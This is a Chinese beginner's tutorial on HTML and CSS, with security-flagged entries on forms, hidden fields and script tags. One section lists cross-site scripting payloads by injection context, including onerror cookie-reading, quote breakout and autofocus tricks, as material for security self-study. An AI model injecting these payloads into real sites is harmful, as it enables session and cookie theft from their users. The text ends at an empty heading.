# 前端设计：从小白到精通

> 收集范围：HTML（网页结构）＋ CSS（网页样式）＋ JavaScript（网页行为）——从零搭一个网页的三件套。每条固定「解析｜操作｜提醒」三段，示例标注真实输出。

## 怎么用这份文件

1. 这份笔记把「做一个网页」要会的三件事合成一份：**HTML 管有什么（结构）、CSS 管长什么样（样式）、JavaScript 管会动什么（行为）**。三部分按学习顺序排：先 HTML 搭出内容骨架，再 CSS 给它上色排版，最后 JavaScript 让它动起来、响应用户。
2. 先看下面的《索引 · 速查表》，一行一条，点「用法」列直接跳到正文对应位置；忘了哪条，按分类扫一遍就能找到。
3. 正文每条固定三段：**解析**（白话讲清它是什么、什么时候用）、**操作**（能直接复制运行的示例，`//` 后是真实输出）、`> ⚠️ 坑`（易错点，没有就不写）。
4. 标题末尾带 **🔒** 的是和 Web 安全（XSS / 越权）相关的条目，解析里会点明它在攻防里怎么用——自学网安的重点之一。
5. 示例怎么自测：标 `html` 的整段复制进一个 `.html` 文件、双击用浏览器打开看效果；标 `javascript` 的粘进浏览器控制台（F12 → Console）或 Node 里跑；标 `text` 的多是「写在哪个位置」的对照说明。
6. 内容**允许跨条目重复**（同一个属性/方法在不同标签下各写一遍）：你是「从索引直接跳进来查」的，重复比来回翻页省事，这是故意的。

## HTML 一 文档结构

### `<!DOCTYPE html>` 声明文档类型

**解析**　写在 HTML 文件的最上面第一行，告诉浏览器「这是一份 HTML5 网页」。不写的话浏览器会进入「怪异模式」，某些样式和布局会跟你预期的不一样。一个页面只写一次。

**操作**

```html
<!DOCTYPE html>
<html>
  <head><title>我的网页</title></head>
  <body>你好</body>
</html>
```

> ⚠️ 坑　必须放在第一行，前面不能有空格、空行或注释，否则声明会被忽略。

### `html` 根元素

**解析**　整份文档最外层的容器，除 DOCTYPE 外所有内容都包在 `<html>...</html>` 里。用 `lang` 属性声明页面语言（中文写 `lang="zh-CN"`），方便浏览器和读屏软件处理。

**操作**

```html
<!DOCTYPE html>
<html lang="zh-CN">
  <head>...</head>
  <body>...</body>
</html>
```

> ⚠️ 坑　一个页面只有一个 `<html>` 根元素，别再往里套第二个。

### `head` 文档头部

**解析**　放「给浏览器看、不直接显示」的信息：网页标题 `<title>`、字符编码 `<meta charset>`、引用的 CSS 和 JS。用户看不到 `head` 里的内容（除了浏览器标签页上显示的标题）。

**操作**

```html
<head>
  <meta charset="UTF-8">          <!-- 用 UTF-8，中文才不会乱码 -->
  <title>我的第一个网页</title>
  <style>body { color: red; }</style>
</head>
```

> ⚠️ 坑　忘了写 `<meta charset="UTF-8">`，中文在有些浏览器里会变成一串乱码。

### `body` 可见内容

**解析**　页面上真正能看到的东西全放 `<body>` 里：文字、图片、按钮、表格。一个页面只有一个 `body`。

**操作**

```html
<body>
  <h1>欢迎</h1>
  <p>这是正文。</p>
</body>
```

> ⚠️ 坑　写在 `<head>` 里的正文文字不会显示，新手常把内容写错标签。

## HTML 二 文本与容器

### `h1`~`h6` 标题

**解析**　`<h1>` 到 `<h6>` 是六级标题，`h1` 最大最重要、`h6` 最小。它们用来搭文章大纲，让浏览器和搜索引擎知道内容层级——不是为了「把字变大」，那件事归 CSS 管。

**操作**

```html
<h1>一级标题</h1>
<h2>二级标题</h2>
<h3>三级标题</h3>
<h6>六级标题</h6>
```

> ⚠️ 坑　一个页面一般只用一个 `<h1>`，标题等级不要跳级（别从 `h1` 直接跳到 `h4`）。

### `p` 段落

**解析**　一段文字。浏览器会自动在段落前后留出空白间距，这是它省心的地方。`<p>` 里不要再嵌一个 `<p>`，浏览器会强行拆开。

**操作**

```html
<p>这是第一段。</p>
<p>这是第二段。</p>
```

### `br` 与 `hr` 换行与分割线

**解析**　`<br>` 在当前位置强制换行（像 Shift+Enter，但仍在同一段里）；`<hr>` 画一条水平分割线，用来隔开两块内容。两个都是「空元素」，没有结束标签。

**操作**

```html
<p>第一行<br>第二行</p>
<hr>
<p>分割线下面的内容</p>
```

> ⚠️ 坑　不要用一堆 `<br>` 代替段落间距，段间距是 `<p>` 的活；`<br>` 只用来在段内换行。

### `span` 行内容器

**解析**　一个「行内」盒子，用来给一小段文字套个壳，方便加样式或让 JS 定位它。它自己不换行、不占整行，宽度只跟着内容走。

**操作**

```html
<p>价格：<span style="color:red">￥99</span> 元</p>
```

> ⚠️ 坑　`span` 是行内元素，给它设 `width`/`height` 通常不生效——要撑整行请用 `div`。

### `div` 块级容器

**解析**　一个「块级」盒子，独占一整行，用来把一堆元素框成一块做布局。`<div>` 本身没有任何视觉效果，纯粹是分区，样式靠 CSS 加。

**操作**

```html
<div id="header">
  <h1>网站标题</h1>
</div>
<div id="main">
  <p>正文</p>
</div>
```

> ⚠️ 坑　别把 `span`（行内）和 `div`（块级）用反；不确定时先想「这一块要不要独占一行」。

## HTML 三 链接、图片与属性

### `a` 超链接

**解析**　点击跳到另一个网址或页面、跳到本页某处、或触发下载。`href` 写目标地址：写完整网址是外链，写 `#id` 是跳到本页某元素。

**操作**

```html
<a href="https://example.com">去 example</a>
<a href="#top">回到顶部</a>
<a href="https://example.com" target="_blank">新标签页打开</a>
```

> ⚠️ 坑　`href` 写 `javascript:alert(1)` 会执行 JS，这是 XSS 的一种入口（见「标签之间注入」）。

### `img` 图片

**解析**　插入一张图片。`src` 是图片地址（本地文件或网址都行），`alt` 是图片加载失败时显示的替代文字。图片按原始大小显示，可用 `width`/`height` 缩放。

**操作**

```html
<img src="cat.jpg" alt="一只橘猫" width="200">
<img src="https://example.com/a.png" alt="示例图">
```

> ⚠️ 坑　`img` 是空元素，写作 `<img>`，没有 `</img>`。

### 属性 `href` 与 `src` 地址

**解析**　`href` 给 `<a>`（以及 `<link>`）指定跳转或关联的目标地址；`src` 给 `<img>`、`<script>`、`<iframe>` 指定要加载的资源地址。一个是「带我去哪」，一个是「把什么装进来」。

**操作**

```html
<a href="/login">登录</a>
<img src="/static/logo.png" alt="logo">
<script src="/js/app.js"></script>
```

> ⚠️ 坑　`href` 常被攻击者改成 `javascript:` 伪协议来执行脚本；`src` 可控时则可能变成数据外发的出口。

### 属性 `alt` 替代文本

**解析**　图片显示不出来时替代它的文字，同时供读屏软件朗读。给每张有意义的图加 `alt` 是基本习惯，也方便搜索引擎理解图片。

**操作**

```html
<img src="broken.jpg" alt="加载失败时你会看到这行字">
```

> ⚠️ 坑　纯装饰性的图片写 `alt=""`（空值），表示「无需朗读」，不要漏写 `alt`。

### 属性 `id` 与 `class`

**解析**　`id` 是元素的唯一编号，同一页面里不能重复；`class` 是可复用的一组标签名，多个元素可以同名。CSS 用 `#id` 选、用 `.class` 选，JS 用 `document.getElementById()` 按 `id` 找。

**操作**

```html
<div id="login" class="panel box">...</div>
<div class="panel">...</div>
<style>
  #login { width: 300px; }
  .panel { border: 1px solid #ccc; }
</style>
```

> ⚠️ 坑　`id` 重复时 `getElementById` 只会拿到第一个，前端逻辑 bug 常常出在这。

### 属性 `onclick` 点击事件🔒

**解析**　元素被点击时执行的 JavaScript，写法是 `onclick="要执行的代码"`。方便的地方是把 JS 直接写在属性里；危险的地方也在这——一旦攻击者能控制这段属性值，就能注入脚本。

**操作**

```html
<button onclick="alert('你点了按钮')">点我</button>
```

> ⚠️ 安全　`onclick="alert(1)"` 是最经典的 XSS 验证；可控的 `onclick` 属性值本身就是注入点（见「属性值里注入」）。

## HTML 四 列表与表格

### `ul` 与 `ol` 列表

**解析**　`<ul>` 是无序列表（每项前是圆点），`<ol>` 是有序列表（每项前是 1. 2. 3.）。列表里每个条目都要用 `<li>` 包起来。

**操作**

```html
<ul>
  <li>苹果</li>
  <li>香蕉</li>
</ul>
<ol>
  <li>第一步</li>
  <li>第二步</li>
</ol>
```

> ⚠️ 坑　直接往 `<ul>` 里塞文字而不放 `<li>`，浏览器会自行修正结构但很乱，别这么写。

### `li` 列表项

**解析**　列表里的一项，必须放在 `<ul>` 或 `<ol>` 里。`<li>` 内部还能再放一个子列表，做成多级列表。

**操作**

```html
<ul>
  <li>水果
    <ul><li>苹果</li></ul>
  </li>
  <li>蔬菜</li>
</ul>
```

### `table` 表格

**解析**　数据表格的外框，由行 `<tr>` 和单元格 `<td>` 组成。不要拿表格做网页整体布局（早就过时了），但展示二维数据仍然常用。

**操作**

```html
<table border="1">
  <tr><th>姓名</th><th>年龄</th></tr>
  <tr><td>小明</td><td>18</td></tr>
</table>
```

> ⚠️ 坑　`border="1"` 只是为了能看见框线，正式样式应该交给 CSS。

### `tr` 表格行

**解析**　表格的一行，里面装若干 `<td>`（数据格）或 `<th>`（表头格）。行与行从上到下排列。

**操作**

```html
<table>
  <tr><td>第一行第一列</td><td>第一行第二列</td></tr>
  <tr><td>第二行第一列</td><td>第二行第二列</td></tr>
</table>
```

### `td` 与 `th` 单元格

**解析**　`<td>` 是普通数据单元格，`<th>` 是表头单元格（默认加粗居中）。两者都必须放在 `<tr>` 里。

**操作**

```html
<table border="1">
  <tr><th>商品</th><th>价格</th></tr>
  <tr><td>键盘</td><td>199</td></tr>
</table>
```

> ⚠️ 坑　用 `colspan` 合并列、`rowspan` 合并行，例如 `<td colspan="2">合计</td>`。

## HTML 五 表单

### `form` 表单容器

**解析**　把一组输入控件打包，用来把用户填的数据发给服务器。`input`、`button` 都放在它里面。服务器收到的是字段名和值组成的键值对。

**操作**

```html
<form method="post" action="/login">
  <input type="text" name="user">
  <input type="password" name="pass">
  <button type="submit">登录</button>
</form>
```

> ⚠️ 坑　提交一份空表单也算一次真实请求，后端必须把每个字段重新校验一遍。

### `form` 的 `method` 提交方式

**解析**　决定数据怎么发给服务器。`get` 把参数拼在 URL 后面（`?q=xxx`），`post` 把数据放在请求体里。查询类操作用 `get`，提交密码、修改数据用 `post`。

**操作**

```html
<form method="get" action="/search">
  <input type="text" name="q">
  <button type="submit">搜索</button>
</form>
<!-- 提交后地址栏变成 /search?q=你输入的内容 -->
```

> ⚠️ 坑　`get` 的参数会留在浏览器历史、服务器日志里，绝不要用它传密码。

### `form` 的 `action` 提交地址🔒

**解析**　表单数据发往哪个 URL。留空则发回当前页面。它和 `method` 一起决定「用哪种方式、发到哪里」。

**操作**

```html
<form method="post" action="/api/login">...</form>
```

> ⚠️ 安全　`action` 指向哪、后端有没有校验、有没有 CSRF Token，是测登录和越权时最先看的信息。

### `input` 输入控件

**解析**　最常用的输入控件。靠 `type` 属性决定它是文本框、密码框还是按钮；`name` 决定它提交给服务器时叫什么；`value` 是它当前的值。

**操作**

```html
<input type="text" name="username" value="默认值">
```

> ⚠️ 坑　`value` 里放用户输入时一定要转义，否则引号可以被闭合、往属性里注入代码（见「属性值里注入」）。

### `input` 文本框与密码框

**解析**　`type="text"` 显示明文，适合用户名、搜索词等；`type="password"` 输入时显示成圆点（`••••`），适合密码。注意它只是「看不见」，并不负责加密。

**操作**

```html
<input type="text" name="user" placeholder="用户名">
<input type="password" name="pass">
```

> ⚠️ 坑　`password` 遮的只是屏幕，传输安全要靠 HTTPS，别在 http 页面上提交密码。

### `input` 隐藏域🔒

**解析**　`type="hidden"` 的输入框不在页面上显示，但会随表单一起提交。常用来携带 token、用户 id 等前端看不见的字段。

**操作**

```html
<input type="hidden" name="user_id" value="1024">
```

> ⚠️ 安全　「对用户隐藏」不等于「对攻击者隐藏」：值能随手改，绝不能拿它做权限判断——越权漏洞常见的起因就是这里。

### `button` 与 `input` 提交按钮

**解析**　`<button>` 是可点击按钮；提交表单也可以写成 `<input type="submit" value="按钮文字">`。`button` 的 `type` 有 `submit`（默认，提交表单）、`button`（普通按钮，常配 `onclick`）、`reset`（清空表单）。

**操作**

```html
<button type="submit">提交</button>
<button type="button" onclick="alert('hi')">点我</button>
<input type="submit" value="保存">
```

> ⚠️ 坑　`button` 在表单里默认就是 `submit`，想让它只当普通按钮必须写 `type="button"`，否则会意外提交表单。

### 属性 `name` 与 `value`

**解析**　`name` 是表单字段提交给服务器时的「键名」，`value` 是它的「值」。服务器收到的是 `name=value` 这样的键值对。

**操作**

```html
<input type="text" name="city" value="北京">
<!-- 提交后服务器收到 city=北京 -->
```

> ⚠️ 坑　没有 `name` 的 `input` 不会被提交，这是新手最常踩的坑。

### 属性 `placeholder` 占位提示

**解析**　输入框里的灰色提示文字，告诉用户该填什么。一旦开始输入它就会消失，也不会真的作为值提交。

**操作**

```html
<input type="text" name="email" placeholder="请输入邮箱">
```

> ⚠️ 坑　`placeholder` 既不是标签也不是默认值，别拿它当字段说明或做校验。

## HTML 六 脚本、样式与嵌入

### `script` 脚本🔒

**解析**　在页面里写或引入 JavaScript。直接写在标签之间用于小脚本，用 `src` 引入外部 `.js` 文件。浏览器读到就会执行。

**操作**

```html
<script>console.log("页面加载了");</script>
<script src="/js/app.js"></script>
```

> ⚠️ 安全　`<script>` 里的内容会被浏览器当代码执行，所以「用户输入被直接放进 script 标签」是最高危的 XSS（见「`script` 内注入」）。

### `style` 页面样式

**解析**　在页面里写 CSS，控制颜色、大小、布局。内容不会显示出来，只被浏览器解析成样式规则。

**操作**

```html
<style>
  p { color: #333; font-size: 16px; }
  .red { color: red; }
</style>
<p class="red">这段是红的</p>
```

### `iframe` 内嵌框架🔒

**解析**　在当前页面里嵌入另一个网页，`src` 写被嵌入页面的地址。常用于嵌广告、视频播放器、第三方登录框。

**操作**

```html
<iframe src="https://example.com" width="400" height="200"></iframe>
```

> ⚠️ 安全　`iframe` 是 XSS 和点击劫持（透明层盖住真按钮骗点击）的常见载体，`src` 可控时还能被用来钓鱼或跳转。

### HTML 注释

**解析**　用 `<!-- ... -->` 包起来的文字会被浏览器完全忽略，用来写给自己或同事看的说明。注意注释在「查看源代码」里一览无余，别往里放敏感信息。

**操作**

```html
<!-- 下面是导航栏 -->
<nav>首页 | 关于</nav>
```

> ⚠️ 坑　注释不能嵌套注释；内容里出现连续的 `--` 可能提前结束注释。

### HTML 实体转义🔒

**解析**　有些字符在 HTML 里另有含义，想显示它们本身得写成「实体」：`&lt;` 显示 `<`，`&gt;` 显示 `>`，`&amp;` 显示 `&`，`&quot;` 显示 `"`。这一层转义是防 XSS 的第一道拦网。

**操作**

```html
<p>算术里 1 &lt; 2 且 3 &gt; 2。</p>
<p>AT&amp;T 公司</p>
<!-- 浏览器显示：算术里 1 < 2 且 3 > 2。  /  AT&T 公司 -->
```

> ⚠️ 安全　把用户输入里的 `<` `>` `&` `"` `'` 转义后再输出，能挡住大部分「闭合标签 / 闭合属性」型 XSS；漏掉引号转义就对应「属性值里注入」。

## HTML 七 XSS 注入语境

### XSS 注入语境🔒

**解析**　XSS（跨站脚本）就是把攻击者的 JavaScript 塞进页面、在别人的浏览器里执行。同一段意图放进不同的「语境」，要写成不同的样子才能生效。判定方法只有一句：**你的输入落在 HTML 的哪个位置，就按那个位置的语法去「逃出」它**。

**操作**

```text
输入落点            变形思路
标签之间         →  直接写一个新标签（<script>…）
属性值里         →  先闭合引号，再补一个新属性/事件
<script> 内     →  闭合 </script> 或直接构造合法 JS
```

> ⚠️ 坑　变形的核心永远是「先闭合包住你的那层语法，再注入自己的」；下面五条按语境拆开写。

### `标签之间` 注入🔒

**解析**　当你的输入被放在两个标签之间（如 `<div>你在这里</div>`），可以直接写一个新标签。经典 payload 是 `<script>alert(1)</script>`；很多网站会过滤 `script`，于是改用 `<img src=x onerror=alert(1)>`。

**操作**

```html
<div>用户输入：<script>alert(1)</script></div>
<!-- 被过滤 script 时改用不依赖 script 标签的写法： -->
<div><img src=x onerror=alert(1)></div>
```

### `属性值里` 注入🔒

**解析**　输入落在属性值里（如 `<input value="你在这里">`），要先用引号闭合属性，再补一个新属性——最常用的是事件属性（`onmouseover`、`onfocus`、`onerror`）。属性用双引号就用双引号闭合。

**操作**

```html
原始：<input value="INPUT">
payload："><img src=x onerror=alert(1)>
结果：  <input value=""><img src=x onerror=alert(1)>">
<!-- 属性用单引号时：INPUT 位置填  ' onmouseover='alert(1) -->
```

> ⚠️ 坑　外包引号是双引号还是单引号，决定你用哪个符号闭合，payload 要跟着变。

### `script` 内注入🔒

**解析**　输入落在 `<script>` 标签内部（如 `<script>var a = "你在这里";</script>`）。不能直接再写 `<script>`，要么先用 `</script>` 提前结束、再插新标签，要么直接构造能在 JS 里跑起来的代码。

**操作**

```html
<!-- 闭合现有字符串，把后面的代码注释掉 -->
<script>var name = "hello";alert(1);//";</script>

<!-- 或用 </script> 提前结束标签，再接一个全新标签 -->
<script>var name = "</script><img src=x onerror=alert(1)>";</script>
```

> ⚠️ 坑　`</script>` 在 HTML 里就是结束标记，浏览器解析时优先按标签处理，所以它常常「逃出」脚本字符串。

### `img onerror` 注入🔒

**解析**　`<img>` 没有结束标签，加载失败时会触发 `onerror`。让 `src` 指向一张不存在的图片，`onerror` 里的代码就会自动执行——不需要用户点任何东西，所以这是最通用的 XSS payload。

**操作**

```html
<img src=x onerror="alert(1)">
<img src=x onerror=alert(document.cookie)>
```

> ⚠️ 安全　`onerror` 免交互、`img` 又几乎不在白名单过滤范围内，是绕过滤的首选；`alert(document.cookie)` 用来验证能否读到 cookie。

### `onfocus` 注入🔒

**解析**　`onfocus` 在元素获得焦点（被选中、点入）时触发。给它配上 `autofocus`，元素一加载就自动获得焦点，于是无需用户操作就执行——常用来绕过「必须有一次交互」的限制。

**操作**

```html
<input autofocus onfocus=alert(1)>
<a href=# onfocus=alert(1) autofocus tabindex=1>点这</a>
```

> ⚠️ 安全　`autofocus` + `onfocus` 是免交互触发的一种，和 `onerror` 一起属于最常用的两类「自动执行」payload。


## CSS 一 引入方式

### `引入 CSS 的三种方式` 总览先看这一条

**解析**　CSS 负责网页「长什么样」。想让它生效，得先「引入」到 HTML 里，就三种方式：①`<style>` 标签把样式写在页面里；②外部 `.css` 文件用 `<link>` 引进来；③直接在标签上写 `style=""` 属性。实际项目一般用 ②，临时调试用 ③。（三件事的分工：HTML 管「有什么」，CSS 管「长什么样」，JS 管「会动什么」。）

**操作**

```text
方式一（页内）： <style> p { color: red; } </style>
方式二（外部）： <link rel="stylesheet" href="style.css">
方式三（行内）： <p style="color: red;">你好</p>
```

> ⚠️ 坑：三种都在时，行内 `style` 优先级最高（详见「优先级与层叠」）。

### `style 标签` 在 HTML 里直接写样式

**解析**　在 `<head>` 里放一个 `<style>...</style>`，把 CSS 规则写进去，整个页面都能用。适合单页面、小 demo。规则格式固定是 `选择器 { 属性: 值; }`。

**操作**

```text
<!DOCTYPE html>
<html>
<head>
  <style>
    p    { color: blue; font-size: 20px; }
    .hi  { background: yellow; }
  </style>
</head>
<body>
  <p>蓝色文字</p>
  <p class="hi">带黄色背景</p>
</body>
</html>
```

> ⚠️ 坑：`<style>` 应写在 `<head>` 里；写在 `<body>` 里多数浏览器也认，但不规范。

### `外部样式表 link` 单独一个 css 文件

**解析**　把 CSS 单独存成一个 `.css` 文件，用 `<link rel="stylesheet" href="...">` 引进来。好处是一个文件能被多个页面共用，改一处全站生效——真实网站都这么干，这也是渗透时你能直接下载、读到的「前端源码」之一。

**操作**

```text
style.css：
  body  { font-family: sans-serif; background: #f5f5f5; }
  .btn  { color: #fff; background: #007bff; padding: 8px 16px; }

index.html：
  <link rel="stylesheet" href="style.css">
```

> ⚠️ 坑：`href` 是相对路径时以「当前页面」为基准（见 URL 篇的「相对 URL vs 绝对 URL」）；写成 `/style.css` 才是从网站根目录开始。

### `行内 style 属性` 在标签上直接写

**解析**　直接在标签上写 `style="属性:值;"`，只作用于这一个元素。优先级最高，但写多了难维护，一般只用于临时改一下，或让 JS 动态改样式。

**操作**

```text
<p style="color: red; font-size: 24px;">这行是红色的</p>
<div style="width: 200px; height: 100px; background: #eee;"></div>
```

> ⚠️ 坑：想临时在浏览器里试样式，用 F12 改行内 `style` 最直观，而且只改本地、不影响服务器。

## CSS 二 选择器

### `元素选择器` 按标签名选

**解析**　选择器决定「这条样式作用在哪些元素上」。最基础的是元素（标签）选择器：直接写标签名，如 `p`、`div`、`a`，页面上所有该标签都命中。

**操作**

```text
p   { color: gray; }               → 所有 <p> 段落变灰
a   { color: blue; }               → 所有链接变蓝
div { border: 1px solid #ccc; }    → 所有 <div> 加边框
```

> ⚠️ 坑：影响面最大，页面上所有同标签元素都被改；要精确定位就用类选择器或 ID 选择器。

### `类选择器 .x` 按 class 选最常用

**解析**　HTML 标签可以带 `class="类名"`，CSS 里用 `.类名` 选中它们。同一个类可以贴到很多元素上，一个元素也可以有多个类（用空格隔开）。这是实际开发里用得最多的选择器。

**操作**

```text
HTML： <p class="note">备注</p>
       <span class="note big">又大又带备注</span>

CSS：  .note   { color: orange; }        → 上面两个都命中
       .big    { font-size: 28px; }      → 只命中第二个
       p.note  { font-style: italic; }   → 只命中 <p class="note">
```

> ⚠️ 坑：类名区分大小写；`.note` 前面的那个点不能漏，写成 `note { }`（没点）会被当成元素选择器去找 `<note>` 标签。

### `ID 选择器 #x` 按 id 选唯一的那个

**解析**　HTML 标签可以带 `id="..."`，CSS 里用 `#id名` 选中。按规范，一个页面里 id 必须唯一，所以它只应该命中一个元素。优先级比类选择器高。

**操作**

```text
HTML： <div id="header">页头</div>
       <div id="footer">页脚</div>

CSS：  #header { background: #333; color: #fff; }
       #footer { font-size: 12px; }
```

> ⚠️ 坑：同一页面里 id 重复是「非法但浏览器不报错」，很容易埋坑；JS 的 `document.getElementById` 也依赖 id 唯一。

### `后代选择器` 空格表示包含关系

**解析**　两个选择器之间用**空格**隔开，表示「前面的里面包含后面的」。如 `div p` 选中「所有 `<div>` 内部的 `<p>`」，不管嵌套多深。用它来限定范围，避免改到别处的同类元素。

**操作**

```text
div p       → <div> 里任意深度的所有 <p>
#nav a      → id 为 nav 的元素里的所有链接
ul li span  → 列表项里的 span
```

> ⚠️ 坑：空格是「后代」（任意层级）；只想要「直接子元素」要用 `>`，如 `div > p`。这两个效果不同，且区别很容易被忽略。

### `群组选择器` 逗号一次选多个

**解析**　用**逗号**把多个选择器并列，表示「命中其中任意一个就套用同一套样式」。等价于把同一段 CSS 抄几遍，但更简洁。

**操作**

```text
h1, h2, h3   { font-family: sans-serif; }     → 三级标题共用同一字体
.note, .warn { border-left: 4px solid; }      → 两个类共享样式
```

> ⚠️ 坑：逗号两边是**独立**的选择器；`div, .x` 是「所有 div 加上所有 .x」，不是「div 里的 .x」（那是 `div .x`，中间是空格）。

### `伪类选择器 :hover` 鼠标悬停时生效

**解析**　伪类选择器用 `:状态` 描述元素的某种**状态**，不改变选中的元素，只在状态成立时套样式。最常用 `:hover`（鼠标悬停），还有 `:visited`（访问过的链接）、`:focus`（获得焦点）、`:first-child`（第一个子元素）、`:nth-child(n)` 等。

**操作**

```text
a:hover         { color: red; }         → 鼠标移到链接上变红
li:first-child  { font-weight: bold; }  → 列表第一项加粗
input:focus     { border-color: blue; } → 输入框聚焦时变色
```

> ⚠️ 坑：`:hover` 只在能悬停的设备（鼠标）上有效，手机上一般没有 hover；调试时别忘了它不是「永久生效」的。

## CSS 三 常用属性

### `color` 文字颜色

**解析**　设置文字（前景）颜色。值可以写颜色名（`red`）、十六进制（`#ff0000`）、`rgb(255,0,0)`、`rgba(255,0,0,0.5)`（最后一位是透明度）、`hsl(...)`。

**操作**

```text
p     { color: red; }
h1    { color: #3366cc; }
.note { color: rgba(0, 0, 0, 0.6); }   /* 60% 不透明的黑 */
```

> ⚠️ 坑：`color` 改的是**文字**；改背景要用 `background`，别搞混。

### `background` 背景颜色与图片

**解析**　设置元素的背景，可以是纯色（`background-color`）、图片（`background-image: url(...)`）、渐变等，还能调位置、是否重复。

**操作**

```text
body    { background: #f5f5f5; }
.banner { background: url("/img/banner.jpg") no-repeat center; }
.grad   { background: linear-gradient(to right, #fff, #000); }
```

> ⚠️ 坑：`background` 简写会把没写的子属性**重置为默认值**；只想改一样（比如只改背景色）就用具体的 `background-color`。

### `font-size` 字号

**解析**　设置文字大小。常用单位：`px`（像素，绝对）、`em`（相对父元素字号）、`rem`（相对根元素字号）、`%`、`vw`（相对视口宽度）。

**操作**

```text
p      { font-size: 16px; }
h1     { font-size: 2rem; }    /* 若根字号 16px，则等于 32px */
.small { font-size: 0.8em; }
```

> ⚠️ 坑：`em` 会层层相乘（父元素的 `em` 影响子元素），嵌套深了很难算；`rem` 只看根元素，更可控。

### `margin 与 padding` 外边距与内边距

**解析**　两者都制造空间，但位置不同：`margin`（外边距）是「自己和别人之间的距离」，在边框**外面**；`padding`（内边距）是「边框和内容之间的距离」，在边框**里面**。形象记：padding 是墙里的家具与墙之间的空隙，margin 是墙与邻居之间的空地。四个方向可以单独设（`margin-top` 等），也能用简写，简写按「上 右 下 左」顺时针。

**操作**

```text
.box {
  padding: 10px;          /* 四边内边距都 10px */
  padding: 10px 20px;     /* 上下 10px，左右 20px */
  margin: 20px auto;      /* 上下 20px，左右自动 → 水平居中 */
  margin-top: 5px;        /* 只改上边距 */
}
```

> ⚠️ 坑：相邻两个块元素的上下 `margin` 会**塌陷**（取较大的那个，不是相加），而 `padding` 不会；给元素加背景色就能直观看出 padding 在背景里、margin 在背景外。

### `border` 边框

**解析**　给元素加边框。简写顺序一般是 `宽度 样式 颜色`，如 `1px solid #ccc`。样式有 `solid`（实线）、`dashed`（虚线）、`dotted`（点线）等；也可以只改一边，如 `border-bottom`。

**操作**

```text
.box  { border: 1px solid #ccc; }
.card { border-top: 3px solid #007bff; border-radius: 8px; }   /* 带圆角 */
```

> ⚠️ 坑：`border` 的粗细会被算进元素的「实际占位」（见「盒子模型」），加了边框元素会变胖；不想变胖就加 `box-sizing: border-box`。

### `width 与 height` 宽和高

**解析**　设置元素内容区的宽和高。单位常用 `px`、`%`（相对父元素）、`vw`/`vh`（相对视口）。是否包含 padding 和 border，取决于 `box-sizing`。

**操作**

```text
.box  { width: 200px; height: 100px; }
.half { width: 50%; }                    /* 父元素宽度的 50% */
.full { width: 100vw; height: 100vh; }   /* 铺满整个视口 */
```

> ⚠️ 坑：默认 `box-sizing: content-box` 时 `width:200px` 只算内容，再加上 padding/border 会超过 200px；加 `box-sizing: border-box` 让宽度包含 padding 和 border，更好算。

### `display` 块级行内怎么排

**解析**　决定元素怎么「占位排版」。`block`（块级）：独占一行、能设宽高，如 `<div>`、`<p>`。`inline`（行内）：跟文字排一行、设宽高无效，如 `<span>`、`<a>`。`inline-block`：行内排列但能设宽高。`none`：直接不显示、不占位。`flex`：开启弹性布局（见「flex 简单布局」）。

**操作**

```text
div   { display: block; }         /* 默认就独占一行 */
span  { display: inline; }        /* 默认跟文字走 */
.tag  { display: inline-block; width: 80px; }   /* 能设宽高又不断行 */
.hide { display: none; }          /* 从页面消失，不留位置 */
```

> ⚠️ 坑：`display: none` 是「不占位地消失」，`visibility: hidden` 是「占着位置但看不见」；想隐藏又不想布局乱动，用后者。

### `position` 定位脱离正常流

**解析**　控制元素怎么定位。`static`（默认，正常流）、`relative`（相对自己原来的位置偏移，仍占位）、`absolute`（相对最近的「已定位」祖先偏移，脱离正常流）、`fixed`（相对浏览器窗口，滚动时不动）、`sticky`（滚到某个位置后粘住）。常配合 `top/right/bottom/left` 使用。

**操作**

```text
.box    { position: relative; }                      /* 给子元素做定位基准 */
.tag    { position: absolute; top: 0; right: 0; }    /* 贴到父元素右上角 */
.header { position: fixed; top: 0; width: 100%; }    /* 固定在浏览器顶部 */
```

> ⚠️ 坑：`absolute` 是相对「最近的、position 不是 static 的祖先」定位；如果祖先都没设 position，它会一路找到 `<html>`，结果飞到整页角落——记得给父元素加 `position: relative`。

## CSS 四 盒子模型与布局

### `盒子模型` 内容内边距边框外边距

**解析**　CSS 里每个元素都是一个矩形「盒子」，从里到外分四层：**内容**（content，文字/图片本身）→ **内边距**（padding）→ **边框**（border）→ **外边距**（margin）。元素的「实际占位」由这四层加起来决定。理解它，是看懂「元素为什么比我想的胖/大」的关键。

**操作**

```text
┌──────────────── margin ────────────────┐
│   ┌──────────── border ────────────┐   │
│   │   ┌──────── padding ────────┐   │   │
│   │   │        content          │   │   │
│   │   └─────────────────────────┘   │   │
│   └─────────────────────────────────┘   │
└─────────────────────────────────────────┘

width:200px; padding:10px; border:1px   → 实际宽度 = 200 + 10×2 + 1×2 = 222px
```

> ⚠️ 坑：用 F12（开发者工具）的「盒模型」面板能一眼看到这四层数值，排查「元素为什么错位」先看它。

### `优先级与层叠` 冲突时谁说了算

**解析**　同一个元素被多条规则命中、又设了同一个属性时，谁生效由**优先级**（选择器越精确越高）和**书写顺序**决定。粗略排序：行内 `style` > `#id` > `.类`/`:伪类`/`[属性]` > `元素`。同优先级则**后写的赢**（这就是「层叠」）。F12 里被划掉的属性，就是「输了」的。

**操作**

```text
优先级（从高到低）：
  行内 style 属性          例：style="color:red"
  #id 选择器               例：#header
  类 / 伪类 / 属性选择器    例：.note / :hover / [type=text]
  元素 / 伪元素选择器        例：p / ::before

p    { color: blue; }
p    { color: red; }    → 同优先级，后写的赢 → 红色
#x   { color: green; }  → id 优先级更高 → 绿色
```

> ⚠️ 坑：`!important` 能强行提高优先级，但用多了样式会彻底失控，前端圈当它「毒药」；看到它先想办法删掉，而不是再加一个压它。

### `flex 简单布局` 让子元素一行排开

**解析**　给父元素加 `display: flex`，它的**直接子元素**就自动排成一行（横向），不再需要 float。父元素上用 `justify-content` 控制主轴（横向）对齐、`align-items` 控制交叉轴（纵向）对齐；子元素上用 `flex: 1` 均分剩余空间。

**操作**

```text
.row {
  display: flex;                  /* 开启弹性布局 */
  justify-content: space-between; /* 主轴两端对齐 */
  align-items: center;            /* 交叉轴居中 */
  gap: 10px;                      /* 子元素之间留 10px 间隙 */
}
.row .item { flex: 1; }           /* 每个子元素平分宽度 */
```

> ⚠️ 坑：`display: flex` 只作用于**直接子元素**，孙元素不受影响；「主轴/交叉轴」最容易记反——`justify-content` 管主轴，`align-items` 管交叉轴。

## CSS 五 CSS 与安全

### `CSS 与 Web 安全的关系` 排查注入点时顺带看一眼🔒

